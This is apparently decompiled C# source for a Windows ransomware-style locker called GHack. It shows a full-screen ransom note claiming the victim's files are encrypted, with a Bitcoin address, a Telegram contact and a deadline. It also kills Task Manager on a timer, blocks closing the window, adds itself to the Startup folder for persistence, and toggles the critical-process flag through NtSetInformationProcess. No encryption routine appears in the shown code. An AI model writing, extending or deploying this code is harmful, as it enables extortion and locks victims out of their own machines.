using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace GHack;

public class Form1 : Form
{
	private IContainer components;

	private Timer timer1;

	private Timer timer2;

	private Label Exit;

	private Button SubmitButton;

	private TextBox Code;

	private Label label6;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TextBox textBox9;

	private Button button13;

	private TextBox textBox12;

	private Label label7;

	private TextBox textBox11;

	private TextBox textBox10;

	private TextBox textBox8;

	private TextBox textBox7;

	private TextBox textBox6;

	private TextBox textBox5;

	private TextBox textBox4;

	private TextBox textBox3;

	private TextBox textBox2;

	private TextBox textBox1;

	private TabPage tabPage2;

	private Label label5;

	private Label label4;

	private Label label3;

	private PictureBox pictureBox2;

	private Label label2;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public Form1()
	{
		InitializeComponent();
	}

	private void createShortcut()
	{
		using StreamWriter streamWriter = new StreamWriter(string.Concat("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", "\\GHack.url"));
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
		streamWriter.Flush();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Deactivate(object sender, EventArgs e)
	{
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form1_Leave(object sender, EventArgs e)
	{
	}

	private void FixButton_Click(object sender, EventArgs e)
	{
		exitprogram();
	}

	private void exitprogram()
	{
		Process[] processesByName = Process.GetProcessesByName("GHack");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
	}

	private void Exit_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("There is no scape!", "There is no scape!");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)Code).get_Text() == "1234567890")
		{
			int processInformation = 0;
			Process.EnterDebugMode();
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
			Process.Start("C:\\startexplorer.bat");
			exitprogram();
		}
		else
		{
			MessageBox.Show("Wrong code!", "NOPE");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_035d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0367: Expected O, but got Unknown
		//IL_0615: Unknown result type (might be due to invalid IL or missing references)
		//IL_0721: Unknown result type (might be due to invalid IL or missing references)
		//IL_072b: Expected O, but got Unknown
		//IL_07d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_07db: Expected O, but got Unknown
		//IL_0890: Unknown result type (might be due to invalid IL or missing references)
		//IL_089a: Expected O, but got Unknown
		//IL_0934: Unknown result type (might be due to invalid IL or missing references)
		//IL_093e: Expected O, but got Unknown
		//IL_09e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ee: Expected O, but got Unknown
		//IL_0a94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9e: Expected O, but got Unknown
		//IL_0b43: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4d: Expected O, but got Unknown
		//IL_0c09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c13: Expected O, but got Unknown
		//IL_0cbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc8: Expected O, but got Unknown
		//IL_0d6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d76: Expected O, but got Unknown
		//IL_0e1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e28: Expected O, but got Unknown
		//IL_0ec9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed3: Expected O, but got Unknown
		//IL_0f73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7d: Expected O, but got Unknown
		//IL_102f: Unknown result type (might be due to invalid IL or missing references)
		//IL_109e: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a8: Expected O, but got Unknown
		//IL_113f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1149: Expected O, but got Unknown
		//IL_11e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ea: Expected O, but got Unknown
		//IL_1301: Unknown result type (might be due to invalid IL or missing references)
		//IL_130b: Expected O, but got Unknown
		//IL_146d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1477: Expected O, but got Unknown
		//IL_147f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1489: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		SubmitButton = new Button();
		Code = new TextBox();
		Exit = new Label();
		label6 = new Label();
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		textBox9 = new TextBox();
		button13 = new Button();
		textBox12 = new TextBox();
		label7 = new Label();
		textBox11 = new TextBox();
		textBox10 = new TextBox();
		textBox8 = new TextBox();
		textBox7 = new TextBox();
		textBox6 = new TextBox();
		textBox5 = new TextBox();
		textBox4 = new TextBox();
		textBox3 = new TextBox();
		textBox2 = new TextBox();
		textBox1 = new TextBox();
		tabPage2 = new TabPage();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		pictureBox2 = new PictureBox();
		label2 = new Label();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)SubmitButton).set_Location(new Point(657, 355));
		((Control)SubmitButton).set_Name("SubmitButton");
		((Control)SubmitButton).set_Size(new Size(75, 23));
		((Control)SubmitButton).set_TabIndex(2);
		((Control)SubmitButton).set_Text("Submit");
		((ButtonBase)SubmitButton).set_UseVisualStyleBackColor(true);
		((Control)SubmitButton).add_Click((EventHandler)button1_Click);
		((Control)Code).set_Location(new Point(604, 329));
		((TextBoxBase)Code).set_MaxLength(10);
		((Control)Code).set_Name("Code");
		((Control)Code).set_Size(new Size(183, 20));
		((Control)Code).set_TabIndex(1);
		((Control)Exit).set_AutoSize(true);
		((Control)Exit).set_Cursor(Cursors.get_Hand());
		((Control)Exit).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Exit).set_Location(new Point(901, 16));
		((Control)Exit).set_Name("Exit");
		((Control)Exit).set_Size(new Size(26, 25));
		((Control)Exit).set_TabIndex(0);
		((Control)Exit).set_Text("X");
		((Control)Exit).add_Click((EventHandler)Exit_Click);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_BackColor(Color.Black);
		((Control)label6).set_Font(new Font("Microsoft Tai Le", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label6).set_Location(new Point(467, 11));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(419, 34));
		((Control)label6).set_TabIndex(14);
		((Control)label6).set_Text("Your files have been encrypted!");
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage2);
		((Control)tabControl1).set_Location(new Point(276, 36));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(839, 532));
		((Control)tabControl1).set_TabIndex(13);
		((Control)tabPage1).set_BackColor(Color.Black);
		((Panel)tabPage1).set_BorderStyle((BorderStyle)1);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox9);
		((Control)tabPage1).get_Controls().Add((Control)(object)button13);
		((Control)tabPage1).get_Controls().Add((Control)(object)SubmitButton);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox12);
		((Control)tabPage1).get_Controls().Add((Control)(object)Code);
		((Control)tabPage1).get_Controls().Add((Control)(object)label7);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox11);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox10);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox8);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox7);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox6);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox5);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox4);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox3);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox2);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox1);
		((Control)tabPage1).set_Cursor(Cursors.get_Default());
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(831, 506));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("What happened?");
		((Control)textBox9).set_Location(new Point(320, 405));
		((Control)textBox9).set_Name("textBox9");
		((TextBoxBase)textBox9).set_ReadOnly(true);
		((Control)textBox9).set_Size(new Size(199, 20));
		((Control)textBox9).set_TabIndex(19);
		((Control)button13).set_BackColor(Color.Black);
		((Control)button13).set_BackgroundImageLayout((ImageLayout)0);
		((ButtonBase)button13).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 64, 0));
		((ButtonBase)button13).get_FlatAppearance().set_MouseDownBackColor(Color.Black);
		((ButtonBase)button13).get_FlatAppearance().set_MouseOverBackColor(Color.Black);
		((Control)button13).set_Font(new Font("Microsoft Tai Le", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button13).set_ForeColor(Color.Yellow);
		((Control)button13).set_Location(new Point(513, 372));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(92, 27));
		((Control)button13).set_TabIndex(18);
		((Control)button13).set_Text("Generate Key");
		((ButtonBase)button13).set_UseVisualStyleBackColor(false);
		((Control)textBox12).set_BackColor(Color.Black);
		((TextBoxBase)textBox12).set_BorderStyle((BorderStyle)0);
		((Control)textBox12).set_Font(new Font("Microsoft Tai Le", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox12).set_ForeColor(Color.Red);
		((Control)textBox12).set_Location(new Point(450, 460));
		((TextBoxBase)textBox12).set_Multiline(true);
		((Control)textBox12).set_Name("textBox12");
		((Control)textBox12).set_Size(new Size(373, 42));
		((Control)textBox12).set_TabIndex(13);
		((Control)textBox12).set_Text("WARNING: If you close this window your files will be deleted for ever.\r\njust warning you :)");
		textBox12.set_TextAlign((HorizontalAlignment)2);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_BackColor(Color.Black);
		((Control)label7).set_Font(new Font("Microsoft Tai Le", 20.25f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.Yellow);
		((Control)label7).set_Location(new Point(69, 434));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(252, 34));
		((Control)label7).set_TabIndex(11);
		((Control)label7).set_Text("BITCOIN ADDRESS");
		((Control)textBox11).set_BackColor(Color.Black);
		((TextBoxBase)textBox11).set_BorderStyle((BorderStyle)0);
		((Control)textBox11).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox11).set_ForeColor(Color.White);
		((Control)textBox11).set_Location(new Point(10, 362));
		((TextBoxBase)textBox11).set_Multiline(true);
		((Control)textBox11).set_Name("textBox11");
		((Control)textBox11).set_Size(new Size(817, 63));
		((Control)textBox11).set_TabIndex(10);
		((Control)textBox11).set_Text("3. You will recieve a decrypt key to recover all your files \r\nplease keep checking your TELEGRAM.");
		((Control)textBox10).set_BackColor(Color.Black);
		((TextBoxBase)textBox10).set_BorderStyle((BorderStyle)0);
		((Control)textBox10).set_Font(new Font("Microsoft YaHei", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox10).set_ForeColor(Color.Yellow);
		((Control)textBox10).set_Location(new Point(11, 322));
		((TextBoxBase)textBox10).set_Multiline(true);
		((Control)textBox10).set_Name("textBox10");
		((Control)textBox10).set_Size(new Size(147, 27));
		((Control)textBox10).set_TabIndex(9);
		((Control)textBox10).set_Text("Your personal ID:");
		((Control)textBox8).set_BackColor(Color.Black);
		((TextBoxBase)textBox8).set_BorderStyle((BorderStyle)0);
		((Control)textBox8).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox8).set_ForeColor(Color.White);
		((Control)textBox8).set_Location(new Point(10, 279));
		((TextBoxBase)textBox8).set_Multiline(true);
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(817, 63));
		((Control)textBox8).set_TabIndex(7);
		((Control)textBox8).set_Text("For futher information about BTC, please refer to the net \"Payment Tab\".\r\n2. After making a payment with BTC, please send your personal ID to out TELEGRAM: @Rekensom");
		((Control)textBox7).set_BackColor(Color.Black);
		((TextBoxBase)textBox7).set_BorderStyle((BorderStyle)1);
		((Control)textBox7).set_Font(new Font("Microsoft Tai Le", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox7).set_ForeColor(Color.Yellow);
		((Control)textBox7).set_ImeMode((ImeMode)0);
		((Control)textBox7).set_Location(new Point(6, 471));
		((Control)textBox7).set_Name("textBox7");
		((TextBoxBase)textBox7).set_ReadOnly(true);
		((Control)textBox7).set_Size(new Size(413, 27));
		((Control)textBox7).set_TabIndex(6);
		((Control)textBox7).set_Text("1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX");
		textBox7.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox6).set_BackColor(Color.Black);
		((TextBoxBase)textBox6).set_BorderStyle((BorderStyle)0);
		((Control)textBox6).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox6).set_ForeColor(Color.White);
		((Control)textBox6).set_Location(new Point(10, 210));
		((TextBoxBase)textBox6).set_Multiline(true);
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(817, 63));
		((Control)textBox6).set_TabIndex(5);
		((Control)textBox6).set_Text(componentResourceManager.GetString("textBox6.Text"));
		((Control)textBox5).set_BackColor(Color.Black);
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font("Microsoft Tai Le", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox5).set_ForeColor(Color.Yellow);
		((Control)textBox5).set_Location(new Point(6, 187));
		((TextBoxBase)textBox5).set_Multiline(true);
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(238, 26));
		((Control)textBox5).set_TabIndex(4);
		((Control)textBox5).set_Text("How to pay for my private key?");
		((Control)textBox4).set_BackColor(Color.Black);
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)0);
		((Control)textBox4).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox4).set_ForeColor(Color.White);
		((Control)textBox4).set_Location(new Point(10, 120));
		((TextBoxBase)textBox4).set_Multiline(true);
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(817, 63));
		((Control)textBox4).set_TabIndex(3);
		((Control)textBox4).set_Text(componentResourceManager.GetString("textBox4.Text"));
		((Control)textBox3).set_BackColor(Color.Black);
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)0);
		((Control)textBox3).set_Font(new Font("Microsoft Tai Le", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_ForeColor(Color.Yellow);
		((Control)textBox3).set_Location(new Point(6, 99));
		((TextBoxBase)textBox3).set_Multiline(true);
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(219, 26));
		((Control)textBox3).set_TabIndex(2);
		((Control)textBox3).set_Text("How to decrypt my files?");
		((Control)textBox2).set_BackColor(Color.Black);
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)0);
		((Control)textBox2).set_Font(new Font("Microsoft Tai Le", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.Yellow);
		((Control)textBox2).set_Location(new Point(6, 6));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(219, 26));
		((Control)textBox2).set_TabIndex(1);
		((Control)textBox2).set_Text("What happened to my files?");
		((Control)textBox1).set_BackColor(Color.Black);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Microsoft Tai Le", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(6, 30));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(817, 63));
		((Control)textBox1).set_TabIndex(0);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)tabPage2).set_BackColor(Color.Black);
		tabPage2.set_Location(new Point(4, 22));
		((Control)tabPage2).set_Name("tabPage2");
		((Control)tabPage2).set_Padding(new Padding(3));
		((Control)tabPage2).set_Size(new Size(831, 506));
		tabPage2.set_TabIndex(1);
		((Control)tabPage2).set_Text("Payment");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Black);
		((Control)label5).set_Font(new Font("Microsoft Tai Le", 20.25f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Yellow);
		((Control)label5).set_Location(new Point(53, 408));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(125, 34));
		((Control)label5).set_TabIndex(12);
		((Control)label5).set_Text("00:00:00");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Black);
		((Control)label4).set_Font(new Font("Microsoft Tai Le", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(71, 382));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(93, 26));
		((Control)label4).set_TabIndex(11);
		((Control)label4).set_Text("Time left");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Black);
		((Control)label3).set_Font(new Font("Microsoft Tai Le", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(16, 246));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(221, 42));
		((Control)label3).set_TabIndex(10);
		((Control)label3).set_Text("Your KEY will be destroyed on \r\n03/30/2020 00:00:00");
		label3.set_TextAlign((ContentAlignment)32);
		((Control)pictureBox2).set_BackColor(Color.Black);
		((Control)pictureBox2).set_Location(new Point(59, 73));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(133, 117));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Font(new Font("Microsoft Tai Le", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label2).set_Location(new Point(28, 25));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(233, 34));
		((Control)label2).set_TabIndex(8);
		((Control)label2).set_Text("You are hacked..!");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1783, 1061));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)Exit);
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Deactivate((EventHandler)Form1_Deactivate);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Control)this).add_Leave((EventHandler)Form1_Leave);
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
